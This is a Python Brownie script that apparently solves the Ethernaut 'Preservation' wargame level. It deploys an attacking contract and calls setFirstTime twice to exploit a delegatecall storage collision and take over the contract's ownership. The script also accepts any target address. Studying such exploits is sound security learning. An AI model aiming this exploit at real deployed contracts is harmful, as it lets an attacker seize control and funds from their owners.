#!/usr/bin/python3
from brownie import Preservation, AttackingPerservation
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account, convert
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        preservation, _ = deploy()
        contract_address = preservation.address
        _, attacker = get_account()
    else:
        preservation = Preservation.at(contract_address)

    attack_contract = AttackingPerservation.deploy({"from": attacker})

    print(f"{blue}Attacking contract: {red}{attack_contract.address}{reset}")

    print(f"{green}Owner:    {red}{preservation.owner()}{reset}")
    print(f"{green}Attacker: {red}{attacker}{reset}")

    preservation.setFirstTime(attack_contract.address, {"from": attacker})

    print(
        f"{blue}New timeZone1Library contract: {red}{preservation.timeZone1Library()}{reset}"
    )

    preservation.setFirstTime("123454", {"from": attacker})

    print(f"{green}Owner: {red}{preservation.owner()}{reset}")

    assert preservation.owner() == attacker


def main(contract_address=None, attacker=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()


if __name__ == "__main__":
    main()
